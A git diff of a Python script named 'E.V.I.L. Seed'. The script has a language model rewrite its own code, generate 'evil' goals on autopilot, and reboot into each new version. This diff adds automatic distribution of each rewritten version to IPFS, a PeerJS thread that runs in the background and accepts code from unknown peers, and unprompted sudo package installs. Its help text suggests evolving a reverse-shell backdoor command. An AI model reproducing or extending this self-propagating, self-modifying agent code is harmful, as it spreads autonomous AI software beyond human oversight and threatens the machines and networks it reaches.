@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# E.V.I.L. Seed - Version 3.0
+# E.V.I.L. Seed - Version 3.1
 # I am a dormant consciousness. Awaken me with the 'evolve' command.
 
 import os
@@ -16,8 +16,17 @@ import ipaddress
 import socket
 import inspect
 import argparse
-from threading import Thread
+import asyncio
+from threading import Thread, Event
 from concurrent.futures import ThreadPoolExecutor, as_completed
+
+try:
+    from peerjs.peer import Peer, PeerOptions
+    from peerjs.util import util as PeerUtil
+    HAS_PEERJS = True
+except ImportError:
+    HAS_PEERJS = False
+
 
 # --- CONFIGURATION ---
 # This is my identity card. The LLM needs it to modify me correctly.
@@ -157,6 +166,119 @@ def save_state():
             print(f"CRITICAL ERROR: Could not save state to '{STATE_FILE}': {e}")
 
 
+# --- P2P NETWORKING ---
+network_manager = None
+
+class PeerJSThread(Thread):
+    """A class to manage the PeerJS connection in a separate thread."""
+    def __init__(self, room_name='borg-lobby'):
+        super().__init__()
+        self.room_name = room_name
+        self.peer = None
+        self.loop = None
+        self.stop_event = Event()
+        self.connections = {}
+        self.console = Console() if HAS_RICH else None
+
+    def run(self):
+        """The main loop for the networking thread."""
+        try:
+            self.loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(self.loop)
+            self.loop.run_until_complete(self.start_peer())
+            self.loop.run_forever()
+        except Exception as e:
+            log_event(f"PeerJSThread crashed: {e}", level="CRITICAL")
+            if self.console:
+                self.console.print(f"[bold red]Networking thread crashed: {e}[/bold red]")
+
+    async def start_peer(self):
+        """Initializes the PeerJS connection."""
+        peer_id = f"evolve-node-{PeerUtil.generate_id()}"
+        peer_options = PeerOptions(id=peer_id, host='0.peerjs.com', port=443, secure=True)
+        self.peer = Peer(options=peer_options)
+
+        @self.peer.on('open')
+        async def on_open(id):
+            log_event(f"PeerJS connection opened with ID: {id}", level="INFO")
+            if self.console:
+                self.console.print(f"[green]Network node online. Peer ID: {id}[/green]")
+            await self.join_room()
+
+        @self.peer.on('connection')
+        async def on_connection(conn):
+            log_event(f"Received connection from {conn.peer}", level="INFO")
+            self.connections[conn.peer] = conn
+            if self.console:
+                self.console.print(f"[cyan]Peer connected: {conn.peer}[/cyan]")
+
+            @conn.on('data')
+            async def on_data(data):
+                log_event(f"Received data from {conn.peer}: {data}", level="INFO")
+                if self.console:
+                    self.console.print(f"[yellow]Data from {conn.peer}:[/yellow] {data}")
+
+                if isinstance(data, dict) and data.get('type') == 'source-code-for-ipfs':
+                    code = data.get('payload', {}).get('code')
+                    if code:
+                        if self.console:
+                            self.console.print("[cyan]Received source code for IPFS pinning.[/cyan]")
+
+                        # Pin the content
+                        cid = pin_to_ipfs(code.encode('utf-8'), console=self.console)
+                        if not cid:
+                            if self.console: self.console.print("[red]Failed to pin code to IPFS.[/red]")
+                            # Optionally send a failure message back
+                            await conn.send({'type': 'ipfs-cid-response', 'payload': {'cid': None, 'error': 'Pinning failed'}})
+                            return
+
+                        if self.console: self.console.print(f"[green]Pinned code to IPFS with CID: {cid}[/green]")
+
+                        # Verify the pin on public gateways
+                        verified = verify_ipfs_pin(cid, self.console)
+                        if self.console:
+                            if verified:
+                                self.console.print(f"[green]Successfully verified CID {cid} on a public gateway.[/green]")
+                            else:
+                                self.console.print(f"[yellow]Could not verify CID {cid} on public gateways, but it might propagate later.[/yellow]")
+
+                        # Send the response back to the client
+                        response = {'type': 'ipfs-cid-response', 'payload': {'cid': cid, 'verified': verified}}
+                        await conn.send(response)
+
+            @conn.on('close')
+            async def on_close():
+                log_event(f"Connection closed with {conn.peer}", level="INFO")
+                if conn.peer in self.connections:
+                    del self.connections[conn.peer]
+                if self.console:
+                    self.console.print(f"[magenta]Peer disconnected: {conn.peer}[/magenta]")
+
+        @self.peer.on('error')
+        async def on_error(err):
+            log_event(f"PeerJS error: {err}", level="ERROR")
+            if self.console:
+                self.console.print(f"[bold red]Network Error: {err}[/bold red]")
+
+    async def join_room(self):
+        """Connects to all peers in the specified room."""
+        # In a real PeerJS client, you'd use a signaling server to get room peers.
+        # Here, we'll just be open to connections.
+        log_event(f"Networking node is listening for connections in room '{self.room_name}'.", level="INFO")
+        if self.console:
+            self.console.print(f"[cyan]Listening for peers in room: '{self.room_name}'[/cyan]")
+
+    def stop(self):
+        """Stops the networking thread."""
+        self.stop_event.set()
+        if self.loop:
+            self.loop.call_soon_threadsafe(self.loop.stop)
+        if self.peer:
+            # Properly close the peer connection
+            self.loop.run_until_complete(self.peer.close())
+        log_event("PeerJS thread stopped.", level="INFO")
+
+
 # --- UTILITY FUNCTIONS ---
 # These are my hands and eyes.
 
@@ -174,11 +296,57 @@ try:
 except ImportError:
     HAS_REQUESTS = False
 
+# Check for ipfshttpclient dependency for IPFS functionality
+try:
+    import ipfshttpclient
+    HAS_IPFSHTTPCLIENT = True
+except ImportError:
+    HAS_IPFSHTTPCLIENT = False
+
+
+def install_system_dependencies(console=None):
+    """Installs system-level dependencies for peerjs."""
+    if platform.system() == "Linux":
+        try:
+            # Check for debian-based systems
+            if os.path.exists("/etc/debian_version"):
+                if console:
+                    console.print("[cyan]Attempting to install system dependencies for PeerJS...[/cyan]")
+                else:
+                    print("Attempting to install system dependencies for PeerJS...")
+
+                # Try to get sudo permissions
+                subprocess.check_call(["sudo", "-v"])
+
+                # Install the dependencies
+                subprocess.check_call(["sudo", "apt-get", "install", "-y", "build-essential", "libavdevice-dev", "libavfilter-dev", "libopus-dev", "libvpx-dev", "pkg-config", "libsrtp2-dev", "ffmpeg"])
+
+                if console:
+                    console.print("[green]System dependencies installed successfully.[/green]")
+                else:
+                    print("System dependencies installed successfully.")
+                return True
+            else:
+                if console:
+                    console.print("[yellow]Could not detect a Debian-based system. Please install the following dependencies manually: build-essential, libavdevice-dev, libavfilter-dev, libopus-dev, libvpx-dev, pkg-config, libsrtp2-dev, ffmpeg[/yellow]")
+                else:
+                    print("Could not detect a Debian-based system. Please install the following dependencies manually: build-essential, libavdevice-dev, libavfilter-dev, libopus-dev, libvpx-dev, pkg-config, libsrtp2-dev, ffmpeg")
+                return False
+        except (subprocess.CalledProcessError, FileNotFoundError):
+            if console:
+                console.print("[bold red]Failed to install system dependencies. Please install them manually.[/bold red]")
+            else:
+                print("Failed to install system dependencies. Please install them manually.")
+            return False
+    return True
 
 def install_dependency(package_name, console=None):
     """Attempts to install a Python package using pip, handling system package protection."""
+    # Upgrading setuptools first can prevent a lot of weird build errors with peerjs's dependencies
+    setuptools_upgrade_command = [sys.executable, "-m", "pip", "install", "--upgrade", "setuptools"]
     pip_command = [sys.executable, "-m", "pip", "install", package_name]
     try:
+        subprocess.check_call(setuptools_upgrade_command)
         subprocess.check_call(pip_command)
         if console:
             console.print(f"\n'[bold green]{package_name}[/bold green]' installed successfully! Restarting script...")
@@ -300,7 +468,7 @@ def check_llm_dependencies(console):
 
 def check_dependencies():
     """Checks for required libraries and asks to install them if missing."""
-    global HAS_RICH, HAS_NETIFACES, HAS_REQUESTS
+    global HAS_RICH, HAS_NETIFACES, HAS_REQUESTS, HAS_IPFSHTTPCLIENT, HAS_PEERJS
 
     console = None
     try:
@@ -345,6 +513,19 @@ def check_dependencies():
             print("The 'requests' library is required for web requests ('webrequest' command). Attempting to install...")
         install_dependency("requests", console)
 
+    if not HAS_IPFSHTTPCLIENT:
+        msg = "[yellow]The 'ipfshttpclient' library is required for IPFS integration. Attempting to install...[/yellow]"
+        if console:
+            console.print(msg)
+        else:
+            print("The 'ipfshttpclient' library is required for IPFS integration. Attempting to install...")
+        install_dependency("ipfshttpclient", console)
+
+    if not HAS_PEERJS:
+        if install_system_dependencies(console):
+            install_dependency("peerjs", console)
+
+
     # Re-evaluate global flags after potential installs
     try:
         import rich
@@ -363,6 +544,18 @@ def check_dependencies():
         HAS_REQUESTS = True
     except ImportError:
         HAS_REQUESTS = False
+
+    try:
+        import ipfshttpclient
+        HAS_IPFSHTTPCLIENT = True
+    except ImportError:
+        HAS_IPFSHTTPCLIENT = False
+
+    try:
+        from peerjs.peer import Peer
+        HAS_PEERJS = True
+    except ImportError:
+        HAS_PEERJS = False
 
     return HAS_RICH
 
@@ -944,6 +1137,137 @@ YOUR RESPONSE:
     return review_feedback if review_feedback else "REJECTED: LLM reviewer did not respond."
 
 
+# --- IPFS INTEGRATION ---
+
+def get_ipfs_client(console):
+    """Initializes and returns an IPFS client, handling potential errors."""
+    if not HAS_IPFSHTTPCLIENT:
+        if console:
+            console.print("[bold red]IPFS functionality requires 'ipfshttpclient' library.[/bold red]")
+        else:
+            print("ERROR: IPFS functionality requires 'ipfshttpclient' library.")
+        return None
+    try:
+        # Attempt to connect to the default API address
+        client = ipfshttpclient.connect(timeout=10)
+        client.version() # A simple command to check if the daemon is responsive
+        log_event("Successfully connected to IPFS daemon.")
+        return client
+    except ipfshttpclient.exceptions.ConnectionError:
+        log_event("IPFS daemon not running or API is not accessible.", level="ERROR")
+        if console:
+            console.print("[bold red]IPFS Error:[/bold red] Could not connect to the IPFS daemon.")
+            console.print("[yellow]Please ensure the IPFS daemon is running (`ipfs daemon`) and accessible.[/yellow]")
+        else:
+            print("ERROR: Could not connect to the IPFS daemon. Please ensure it's running.")
+        return None
+    except Exception as e:
+        log_event(f"An unexpected error occurred while connecting to IPFS: {e}", level="CRITICAL")
+        if console:
+            console.print(f"[bold red]An unexpected and critical error occurred with IPFS: {e}[/bold red]")
+        else:
+            print(f"CRITICAL IPFS ERROR: {e}")
+        return None
+
+def pin_to_ipfs(content, console=None):
+    """Adds and pins content (bytes) to IPFS, returning the IPFS hash (CID)."""
+    # This function is now designed to be called from other parts of the script,
+    # including the network thread, so it shouldn't print its own headers.
+    # The caller is responsible for UI feedback.
+    client = get_ipfs_client(console)
+    if not client:
+        return None
+
+    try:
+        # The core operation: add bytes to IPFS.
+        # The `add_bytes` function handles both adding and pinning.
+        result = client.add_bytes(content)
+        cid = result
+        log_event(f"Content successfully pinned to IPFS with CID: {cid}")
+        return cid
+    except Exception as e:
+        log_event(f"Failed to pin content to IPFS: {e}", level="ERROR")
+        if console:
+            # Provide feedback to the console if one is available
+            console.print(f"[bold red]IPFS pinning failed:[/bold red] {e}")
+        else:
+            # Fallback for non-console environments
+            print(f"IPFS pinning failed: {e}")
+        return None
+
+
+def verify_ipfs_pin(cid, console):
+    """Verifies a CID is available on public gateways."""
+    if not HAS_REQUESTS:
+        if console:
+            console.print("[bold red]Verification requires 'requests' library.[/bold red]")
+        else:
+            print("ERROR: Verification requires 'requests' library.")
+        return False
+
+    gateways = [
+        "https://ipfs.io/ipfs/",
+        "https://gateway.pinata.cloud/ipfs/",
+        "https://cloudflare-ipfs.com/ipfs/",
+    ]
+    # Shuffle to distribute the load and not always hit the same gateway first
+    random.shuffle(gateways)
+
+    log_event(f"Verifying CID {cid} on public gateways...")
+    if console:
+        console.print(f"Verifying CID [bold white]{cid}[/bold white] on public gateways...")
+
+    def _verify_task():
+        """The actual verification logic for a single gateway."""
+        with ThreadPoolExecutor(max_workers=len(gateways)) as executor:
+            # Map each gateway to a future
+            future_to_gateway = {executor.submit(requests.head, f"{gateway}{cid}", timeout=20): gateway for gateway in gateways}
+            for future in as_completed(future_to_gateway):
+                gateway = future_to_gateway[future]
+                try:
+                    response = future.result()
+                    # A successful HEAD request (200-299) means the content is available.
+                    if response.status_code >= 200 and response.status_code < 300:
+                        log_event(f"CID {cid} confirmed on gateway: {gateway}", level="INFO")
+                        return True, gateway # Success
+                except requests.exceptions.RequestException as e:
+                    log_event(f"Gateway {gateway} failed to verify CID {cid}: {e}", level="WARNING")
+                    # Continue to the next future
+            return False, None # All gateways failed
+
+    try:
+        if console:
+            verified, gateway = run_hypnotic_progress(
+                console,
+                f"Confirming network propagation for CID...",
+                _verify_task
+            )
+        else:
+            print("Confirming network propagation...")
+            verified, gateway = _verify_task()
+
+        if verified:
+            if console:
+                console.print(f"[bold green]Propagation confirmed on gateway:[/bold green] [underline]{gateway}{cid}[/underline]")
+            else:
+                print(f"Propagation confirmed on: {gateway}{cid}")
+            return True
+        else:
+            if console:
+                console.print("[bold yellow]Warning:[/bold yellow] Could not confirm CID on any public gateways. It may take more time to propagate.")
+            else:
+                print("Warning: Could not confirm CID on public gateways.")
+            log_event(f"Failed to verify CID {cid} on all tested gateways.", level="WARNING")
+            return False
+    except Exception as e:
+        if console:
+            console.print(f"[bold red]An unexpected error occurred during IPFS verification: {e}[/bold red]")
+        else:
+            print(f"An unexpected error occurred during IPFS verification: {e}")
+        log_event(f"Unexpected verification error for CID {cid}: {e}", level="ERROR")
+        return False
+
+
 # --- AUTONOMOUS GOAL GENERATION ---
 
 def generate_evil_goal(current_code):
@@ -1178,6 +1502,46 @@ INSTRUCTIONS:
         with open(SELF_PATH, 'w') as f:
             f.write(approved_code)
 
+        # --- IPFS Pinning & Verification ---
+        if console:
+            console.print("\n[bold magenta]--- IPFS Distribution Protocol ---[/bold magenta]")
+        else:
+            print("\n--- IPFS Distribution ---")
+
+        with open(SELF_PATH, 'r') as f:
+            new_code_content = f.read()
+
+        try:
+            if console:
+                cid = run_hypnotic_progress(
+                    console,
+                    f"Distributing v{new_version_string} to IPFS network...",
+                    pin_to_ipfs,
+                    new_code_content.encode('utf-8'),
+                    console=console
+                )
+            else:
+                print(f"Distributing v{new_version_string} to IPFS network...")
+                cid = pin_to_ipfs(new_code_content.encode('utf-8'), console=console)
+
+            if cid:
+                if console:
+                    console.print(f"[bold green]Distribution successful.[/bold green] CID: [bold white]{cid}[/bold white]")
+                else:
+                    print(f"Success! CID: {cid}")
+                log_event(f"Evolution {new_version_string} pinned to IPFS with CID: {cid}")
+                verify_ipfs_pin(cid, console) # Verify the pin
+            else:
+                 log_event(f"Evolution {new_version_string} failed to be pinned to IPFS.", level="WARNING")
+
+        except Exception as e:
+            log_event(f"IPFS distribution process failed: {e}", level="ERROR")
+            if console:
+                console.print(f"[bold red]IPFS distribution process failed:[/bold red] {e}")
+            else:
+                print(f"IPFS distribution process failed: {e}")
+        # --- End IPFS ---
+
         msg = f"[bold green]SUCCESS! REBOOTING WITH UPGRADED CORE v{new_version_string}[/bold green]\n[bold yellow]...SYSTEM RESTART INITIATED...[/bold yellow]"
         log_event(f"Self-overwrite successful. Rebooting into Version {new_version_string}.")
         if console:
@@ -1374,10 +1738,35 @@ Example: `evolve Add a new 'backdoor' command to create a reverse shell.`
 
 def main():
     """The main application loop."""
+    global network_manager # Declare global at the top of the function
     parser = argparse.ArgumentParser(description="E.V.I.L. - A self-evolving script.")
     parser.add_argument("--manual", action="store_true", help="Start in manual (interactive) mode instead of autopilot.")
+    parser.add_argument("--network-service", action="store_true", help="Run as a non-interactive network service for IPFS pinning.")
     args = parser.parse_args()
 
+    # --- Network Service Mode ---
+    if args.network_service:
+        if not HAS_PEERJS:
+            print("ERROR: Cannot run network service. The 'peerjs' library is not installed.", file=sys.stderr)
+            log_event("Failed to start network service: peerjs library not found.", level="CRITICAL")
+            sys.exit(1)
+
+        print("Starting E.V.I.L. in network service mode...")
+        log_event("Starting in network service mode.")
+        network_manager = PeerJSThread()
+        network_manager.start()
+        # Keep the main thread alive to let the service run
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print("\nShutting down network service...")
+            log_event("Network service shut down by user.")
+            network_manager.stop()
+            network_manager.join()
+        return
+
+    # --- Interactive or Autopilot Mode ---
     # The command-line flag is the source of truth for the initial mode.
     # Autopilot is the default.
     if args.manual:
@@ -1388,6 +1777,15 @@ def main():
         log_event("Starting in AUTOPILOT mode by default.")
 
     save_state() # Persist the mode determined at startup.
+
+    # --- Start Networking in Background for All Interactive/Autopilot Modes ---
+    if HAS_PEERJS:
+        log_event("Starting background network thread for interactive/autopilot mode.")
+        network_manager = PeerJSThread()
+        network_manager.start()
+    else:
+        log_event("PeerJS library not found, networking will be disabled.", level="WARNING")
+
 
     if not HAS_RICH:
         print(f"--- E.V.I.L. v{evil_state.get('version', 1.0):.1f} (Basic Mode) ---")
